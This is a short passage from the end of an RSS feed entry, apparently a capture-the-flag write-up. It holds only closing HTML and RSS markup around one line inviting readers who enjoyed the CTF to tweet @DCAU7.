</span></span></span><span class="line"><span class="cl"><span class="s2">If you enjoyed this CTF, send me a tweet via @DCAU7.
</span></span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
